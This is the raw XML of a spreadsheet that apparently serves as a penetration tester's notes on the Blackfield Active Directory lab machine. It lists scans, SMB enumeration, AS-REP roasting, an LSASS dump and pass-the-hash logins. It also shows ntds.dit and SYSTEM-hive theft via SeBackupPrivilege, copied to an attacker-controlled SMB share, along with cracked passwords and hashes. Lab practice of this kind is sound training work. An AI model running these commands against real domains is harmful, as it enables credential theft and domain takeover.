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defaultThemeVersion="202300"/>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{202655E8-348C-42FB-8E93-3D88215353B3}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-16320" windowWidth="29040" windowHeight="15720" xr2:uid="{9AA4AFCA-69F3-4FD9-877C-89FBB0C8B483}"/>
  </bookViews>
  <sheets>
    <sheet name="Network" sheetId="1" r:id="rId1"/>
    <sheet name="Web App" sheetId="3" r:id="rId2"/>
    <sheet name="On host" sheetId="4" r:id="rId3"/>
    <sheet name="Commands" sheetId="2" r:id="rId4"/>
    <sheet name="Misc" sheetId="5" r:id="rId5"/>
    <sheet name="Reverse Engineering" sheetId="6" r:id="rId6"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">Network!$A$1:$K$1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E10" i="1" l="1"/>
  <c r="F7" i="1"/>
  <c r="F3" i="1"/>
  <c r="F9" i="1"/>
  <c r="F2" i="1"/>
  <c r="F6" i="1"/>
  <c r="F5" i="1"/>
  <c r="F10" i="1"/>
  <c r="E7" i="1"/>
  <c r="E3" i="1"/>
  <c r="E9" i="1"/>
  <c r="E2" i="1"/>
  <c r="E6" i="1"/>
  <c r="E5" i="1"/>
  <c r="F8" i="1"/>
  <c r="E8" i="1"/>
  <c r="E4" i="1"/>
  <c r="F4" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="135" uniqueCount="96">
  <si>
    <t>IP</t>
  </si>
  <si>
    <t>Hostname</t>
  </si>
  <si>
    <t>Port</t>
  </si>
  <si>
    <t>Protocol</t>
  </si>
  <si>
    <t>Service</t>
  </si>
  <si>
    <t>Notes</t>
  </si>
  <si>
    <t>Commands used</t>
  </si>
  <si>
    <t>Base URL</t>
  </si>
  <si>
    <t>Path</t>
  </si>
  <si>
    <t>Evidence</t>
  </si>
  <si>
    <t>Resources</t>
  </si>
  <si>
    <t>Host</t>
  </si>
  <si>
    <t>User</t>
  </si>
  <si>
    <t>Privileges</t>
  </si>
  <si>
    <t>Groups</t>
  </si>
  <si>
    <t>OS info</t>
  </si>
  <si>
    <t>Status</t>
  </si>
  <si>
    <t>Status + Path (from Kali)</t>
  </si>
  <si>
    <t>Port + Protocol</t>
  </si>
  <si>
    <t>#=LEFT($D2,FIND("/",$D2)-1)</t>
  </si>
  <si>
    <t>#=MID($D2,FIND("/",$D2)+1,LEN($D2))</t>
  </si>
  <si>
    <t>Files/Artifacts</t>
  </si>
  <si>
    <t>Misc</t>
  </si>
  <si>
    <t>cat hosts /etc/hosts | sudo tee /etc/hosts | head -1</t>
  </si>
  <si>
    <t>Task</t>
  </si>
  <si>
    <t>App</t>
  </si>
  <si>
    <t>Sub task</t>
  </si>
  <si>
    <t>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</t>
  </si>
  <si>
    <t>Resource</t>
  </si>
  <si>
    <t>53/tcp</t>
  </si>
  <si>
    <t>135/tcp</t>
  </si>
  <si>
    <t>593/tcp</t>
  </si>
  <si>
    <t>3268/tcp</t>
  </si>
  <si>
    <t>445/tcp</t>
  </si>
  <si>
    <t>53/udp</t>
  </si>
  <si>
    <t>389/tcp</t>
  </si>
  <si>
    <t>88/tcp</t>
  </si>
  <si>
    <t>5985/tcp</t>
  </si>
  <si>
    <t>53/tcp   open  domain        Simple DNS Plus</t>
  </si>
  <si>
    <t>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-21 19:02:39Z)</t>
  </si>
  <si>
    <t>135/tcp  open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</t>
  </si>
  <si>
    <t>445/tcp  open  microsoft-ds?</t>
  </si>
  <si>
    <t>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</t>
  </si>
  <si>
    <t>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)</t>
  </si>
  <si>
    <t>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found</t>
  </si>
  <si>
    <t>ls -1 &gt; ../users.txt</t>
  </si>
  <si>
    <t>sudo ntpdate blackfield.local</t>
  </si>
  <si>
    <t>BLACKFIELD.local</t>
  </si>
  <si>
    <t>Windows DC</t>
  </si>
  <si>
    <t>Nice asrep roasting.
Got password for support.
Now I have access to read Netlogon?
Support is able to perform password reset on audit2020.
Changed password.</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">audit2020:N0ll!!!
#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL)  </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
$krb5asrep$support@BLACKFIELD.LOCAL:a6d83b2dc9ce5d48fac75670afe073ab$e8293ab5ab2b7b9e78f65463ee22bb71cc6c98af85205080fd36dd3a34b717f7f7689605936d5ceedc218150dbff6215cc03f7da766b230636e03c7a66ca5211e777ad2899417dcce9f7c8f17c8aa2ca9fdb2105eea1895d460eeab36469b37b287e4728458f8ef762bf90cea367600ea0eb09cf331da1b285cecab5027d4a5edd1c0bc855a2abeb1723cf353e79ccffd976b6495f66cee9a07bae95a836538bde3fec6d82d7a205764e7ccaed33679e2395ee78ec9b85b478fdd38f342b495e00e71b682a05e1df0954c27b3ff9804bcb9267832e3b678b045b5ed4a2f8dde8b26e101efc62c715b3cd9c40111c4f251766f8f2</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Domain admin: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Ipwn3dYourCompany </t>
    </r>
  </si>
  <si>
    <t>pypykatz lsa minidump /home/kali/htb/blackfield/audit2020/lsass.DMP</t>
  </si>
  <si>
    <t>Forensics share. Sorry profiles share.
Okay now you can get the Forensics share with audit2020. Found some creds for domain admin looks like. I think that might be too easy.
Downloading lsass.zip to extract potential hashes from memory.
Got hash for svc_backup. Can login.</t>
  </si>
  <si>
    <t>user.txt: 3920bb317a0bef51027e2852be64b543</t>
  </si>
  <si>
    <t>Logged in as user svc_backup.</t>
  </si>
  <si>
    <t>blackfield\svc_backup</t>
  </si>
  <si>
    <t>PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</t>
  </si>
  <si>
    <t>GROUP INFORMATION
-----------------
Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288</t>
  </si>
  <si>
    <t>net user svc_backup</t>
  </si>
  <si>
    <t>import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll</t>
  </si>
  <si>
    <t xml:space="preserve">unix2dos vss.dsh </t>
  </si>
  <si>
    <t>diskshadow /s c:\programdata\vss.dsh</t>
  </si>
  <si>
    <t>smbserver.py s . -smb2support -username null -password null</t>
  </si>
  <si>
    <t>set context persistent nowriters
set metadata c:\programdata\null.cab
set verbose on
add volume c: alias null
create
expose %null% z:</t>
  </si>
  <si>
    <t>secretsdump.py -system system -ntds ntds.dit LOCAL</t>
  </si>
  <si>
    <t>sebackupprivilege is enabled. Allows reading of majority of files on system as non admin account.
Looking to grab ntds.dit. This has all the password hashes. Can't grab it directly. Require diskshadow.
"SeBackupPrivilege + ntds.dit: SeBackupPrivilege bypasses the DACL on any file, ntds.dit included — so the ACL is never the blocker. But on a live DC, ntds.dit is also held open by the directory service with an exclusive sharing lock, and the privilege does nothing about that (it bypasses permissions, not locks). That's why you snapshot: the shadow copy is a frozen, unlocked version of the file. Privilege handles the ACL, snapshot handles the lock — you need both. The exception is an offline/mounted/backup copy where nothing holds the file open; there the lock problem is gone and the privilege alone is enough."
Wrote a script to expose shadow copy on a volume for diskshadow.
Yeah able to dump the admin hash.</t>
  </si>
  <si>
    <t>blackfield\administrator</t>
  </si>
  <si>
    <t>root.txt: 4375a629c7c67c8e29db269060c955cb</t>
  </si>
  <si>
    <t>Rooted</t>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim IP] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -T3 -v [victim IP]</t>
  </si>
  <si>
    <t>netexec smb [victim IP] --generate-hosts-file hosts</t>
  </si>
  <si>
    <t>netexec smb [victim IP]  -u '' -p '' --shares</t>
  </si>
  <si>
    <t>netexec smb [victim IP] -u 'null' -p '' --shares</t>
  </si>
  <si>
    <t>GetNPUsers.py BLACKFIELD.local/ -usersfile "users.txt" -dc-ip [victim IP] -request -format john</t>
  </si>
  <si>
    <t>evil-winrm -i [victim IP] -u support -p '#00^BlackKnight'</t>
  </si>
  <si>
    <t>enum4linux -a [victim IP]</t>
  </si>
  <si>
    <t>smbclient //[victim IP]/Net -U 'svc_apache%S@Ss!K@*t13' -c 'recurse ON; prompt OFF; mget *'</t>
  </si>
  <si>
    <t xml:space="preserve">bloodhound-ce-python -u svc-printer -p '1edFg43012!!' -d return.local -ns [victim IP] -c All --zip </t>
  </si>
  <si>
    <t>smbclient -L //[victim IP] -N</t>
  </si>
  <si>
    <t>smbclient //[victim IP]/forensic -N -c 'recurse ON; prompt OFF; mget *'</t>
  </si>
  <si>
    <t>smbclient -N //[victim IP]/profiles$ -c 'recurse ON; prompt OFF; mget *'</t>
  </si>
  <si>
    <t>GetNPUsers.py BLACKFIELD.local/ -usersfile users.txt -no-pass -dc-ip [victim IP] -format john -outputfile hashes.txt</t>
  </si>
  <si>
    <t>sudo nmap -sU -p123 --script ntp-info [victim IP]</t>
  </si>
  <si>
    <t>rpcclient -U 'blackfield.local/support%#00^BlackKnight' [victim IP] -c 'setuserinfo2 audit2020 23 "N0ll!!!"'</t>
  </si>
  <si>
    <t>nxc smb [victim IP] -u audit2020 -p 'N0ll!!!'</t>
  </si>
  <si>
    <t>smbclient -U audit2020 //[victim IP]/forensic 'N0ll!!!' -c 'recurse ON; prompt OFF; mget *'</t>
  </si>
  <si>
    <t>nxc winrm [victim IP] -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</t>
  </si>
  <si>
    <t>evil-winrm -i [victim IP] -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</t>
  </si>
  <si>
    <t>evil-winrm -i [victim IP] -u administrator -H 184fb5e5178480be64824d4cd53b99ee</t>
  </si>
  <si>
    <t>net use \\[attack IP]\s /u:null null</t>
  </si>
  <si>
    <t>Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\[attack IP]\s\ntds.dit</t>
  </si>
  <si>
    <t>reg.exe save hklm\system \\[attack IP]\s\system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</si>
</sst>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u/>
      <sz val="11"/>
      <color theme="10"/>
      <name val="Aptos Narrow"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="8"/>
      <name val="Aptos Narrow"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="1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9">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="left" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" xfId="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="2" fontId="4" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
  </cellXfs>
  <cellStyles count="2">
    <cellStyle name="Hyperlink" xfId="1" builtinId="8"/>
    <cellStyle name="Normal" xfId="0" builtinId="0"/>
  </cellStyles>
  <dxfs count="2">
    <dxf>
      <fill>
        <patternFill>
          <bgColor theme="6" tint="0.39994506668294322"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor rgb="FFFFC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7C755-4FE5-4C70-ABDC-86E8ABD7F626}">
  <dimension ref="A1:K30"/>
  <sheetViews>
    <sheetView tabSelected="1" zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="H19" sqref="H19"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="18.6640625" style="2" customWidth="1"/>
    <col min="2" max="2" width="15.77734375" style="2"/>
    <col min="3" max="3" width="23" style="2" customWidth="1"/>
    <col min="4" max="4" width="19.6640625" style="2" customWidth="1"/>
    <col min="5" max="5" width="17.6640625" style="2" customWidth="1"/>
    <col min="6" max="6" width="14.77734375" style="2" customWidth="1"/>
    <col min="7" max="7" width="23.5546875" style="2" customWidth="1"/>
    <col min="8" max="8" width="35.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="45.109375" style="2" customWidth="1"/>
    <col min="10" max="10" width="36.6640625" style="2" customWidth="1"/>
    <col min="11" max="11" width="48.33203125" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>15</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>18</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="J1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>49</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>48</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>29</v>
      </c>
      <c r="E2" s="7" t="str">
        <f t="shared" ref="E2:E9" si="0">LEFT($D2,FIND("/",$D2)-1)</f>
        <v>53</v>
      </c>
      <c r="F2" s="6" t="str">
        <f t="shared" ref="F2:F10" si="1">MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v>tcp</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>38</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>49</v>
      </c>
      <c r="C3" s="2" t="s">
        <v>48</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>30</v>
      </c>
      <c r="E3" s="7" t="str">
        <f t="shared" si="0"/>
        <v>135</v>
      </c>
      <c r="F3" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>40</v>
      </c>
      <c r="J3" s="5"/>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>49</v>
      </c>
      <c r="C4" s="2" t="s">
        <v>48</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>31</v>
      </c>
      <c r="E4" s="7" t="str">
        <f t="shared" si="0"/>
        <v>593</v>
      </c>
      <c r="F4" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G4" s="2" t="s">
        <v>43</v>
      </c>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B5" s="2" t="s">
        <v>49</v>
      </c>
      <c r="C5" s="2" t="s">
        <v>48</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>32</v>
      </c>
      <c r="E5" s="7" t="str">
        <f t="shared" si="0"/>
        <v>3268</v>
      </c>
      <c r="F5" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G5" s="2" t="s">
        <v>44</v>
      </c>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B6" s="2" t="s">
        <v>49</v>
      </c>
      <c r="C6" s="2" t="s">
        <v>48</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>33</v>
      </c>
      <c r="E6" s="7" t="str">
        <f t="shared" si="0"/>
        <v>445</v>
      </c>
      <c r="F6" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G6" s="2" t="s">
        <v>42</v>
      </c>
      <c r="H6" s="2" t="s">
        <v>54</v>
      </c>
      <c r="I6" s="2" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B7" s="2" t="s">
        <v>49</v>
      </c>
      <c r="C7" s="2" t="s">
        <v>48</v>
      </c>
      <c r="D7" s="2" t="s">
        <v>34</v>
      </c>
      <c r="E7" s="7" t="str">
        <f t="shared" si="0"/>
        <v>53</v>
      </c>
      <c r="F7" s="6" t="str">
        <f t="shared" si="1"/>
        <v>udp</v>
      </c>
      <c r="I7" s="4"/>
      <c r="J7" s="5"/>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B8" s="2" t="s">
        <v>49</v>
      </c>
      <c r="C8" s="2" t="s">
        <v>48</v>
      </c>
      <c r="D8" s="2" t="s">
        <v>35</v>
      </c>
      <c r="E8" s="7" t="str">
        <f t="shared" si="0"/>
        <v>389</v>
      </c>
      <c r="F8" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G8" s="2" t="s">
        <v>41</v>
      </c>
      <c r="J8" s="5"/>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B9" s="2" t="s">
        <v>49</v>
      </c>
      <c r="C9" s="2" t="s">
        <v>48</v>
      </c>
      <c r="D9" s="2" t="s">
        <v>36</v>
      </c>
      <c r="E9" s="7" t="str">
        <f t="shared" si="0"/>
        <v>88</v>
      </c>
      <c r="F9" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G9" s="2" t="s">
        <v>39</v>
      </c>
      <c r="H9" s="2" t="s">
        <v>50</v>
      </c>
      <c r="I9" s="2" t="s">
        <v>51</v>
      </c>
      <c r="J9" s="5"/>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B10" s="2" t="s">
        <v>49</v>
      </c>
      <c r="C10" s="2" t="s">
        <v>48</v>
      </c>
      <c r="D10" s="2" t="s">
        <v>37</v>
      </c>
      <c r="E10" s="7" t="str">
        <f>LEFT($D10,FIND("/",$D10)-1)</f>
        <v>5985</v>
      </c>
      <c r="F10" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G10" s="2" t="s">
        <v>45</v>
      </c>
      <c r="H10" s="2" t="s">
        <v>56</v>
      </c>
      <c r="I10" s="4" t="s">
        <v>55</v>
      </c>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="1"/>
      <c r="E11" s="7"/>
      <c r="F11" s="6"/>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E12" s="7"/>
      <c r="F12" s="6"/>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E13" s="7"/>
      <c r="F13" s="6"/>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="1"/>
      <c r="E14" s="7"/>
      <c r="F14" s="6"/>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E15" s="7"/>
      <c r="F15" s="6"/>
      <c r="I15" s="4"/>
      <c r="J15" s="5"/>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E16" s="7"/>
      <c r="F16" s="6"/>
    </row>
    <row r="17" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="1"/>
      <c r="E17" s="7"/>
      <c r="F17" s="6"/>
    </row>
    <row r="18" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E18" s="7"/>
      <c r="F18" s="6"/>
    </row>
    <row r="19" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="1"/>
      <c r="E19" s="7"/>
      <c r="F19" s="6"/>
    </row>
    <row r="20" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E20" s="7"/>
      <c r="F20" s="6"/>
    </row>
    <row r="21" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="1"/>
      <c r="E21" s="7"/>
      <c r="F21" s="6"/>
    </row>
    <row r="22" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E22" s="7"/>
      <c r="F22" s="6"/>
    </row>
    <row r="23" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="1"/>
      <c r="E23" s="7"/>
      <c r="F23" s="6"/>
    </row>
    <row r="24" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E24" s="7"/>
      <c r="F24" s="6"/>
    </row>
    <row r="25" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A25" s="1"/>
      <c r="E25" s="7"/>
      <c r="F25" s="6"/>
    </row>
    <row r="26" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E26" s="7"/>
      <c r="F26" s="6"/>
    </row>
    <row r="27" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E27" s="7"/>
      <c r="F27" s="6"/>
    </row>
    <row r="28" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A28" s="1"/>
      <c r="E28" s="7"/>
      <c r="F28" s="6"/>
    </row>
    <row r="29" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E29" s="7"/>
      <c r="F29" s="6"/>
    </row>
    <row r="30" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A30" s="1"/>
      <c r="E30" s="7"/>
      <c r="F30" s="6"/>
    </row>
  </sheetData>
  <autoFilter ref="A1:K1" xr:uid="{6037C755-4FE5-4C70-ABDC-86E8ABD7F626}">
    <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K15">
      <sortCondition ref="E1"/>
    </sortState>
  </autoFilter>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K30">
    <sortCondition ref="F2:F30"/>
    <sortCondition ref="E2:E30"/>
  </sortState>
  <phoneticPr fontId="3" type="noConversion"/>
  <conditionalFormatting sqref="F2:F30">
    <cfRule type="cellIs" dxfId="1" priority="1" operator="equal">
      <formula>"udp"</formula>
    </cfRule>
    <cfRule type="cellIs" dxfId="0" priority="2" operator="equal">
      <formula>"tcp"</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FB5CB-E7C9-4655-B0CB-02AE97F3D2B4}">
  <dimension ref="A1:I22"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" activeCell="D24" sqref="D24"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="31.44140625" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="16384" width="31.44140625" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:9" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1"/>
      <c r="H2" s="5"/>
    </row>
    <row r="3" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1"/>
      <c r="H3" s="5"/>
    </row>
    <row r="4" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="H4" s="5"/>
    </row>
    <row r="8" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="G8" s="5"/>
    </row>
    <row r="9" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E9" s="4"/>
    </row>
    <row r="10" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E10" s="4"/>
    </row>
    <row r="11" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E11" s="4"/>
    </row>
    <row r="12" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E12" s="4"/>
    </row>
    <row r="13" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E13" s="4"/>
    </row>
    <row r="22" spans="8:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="H22" s="5"/>
    </row>
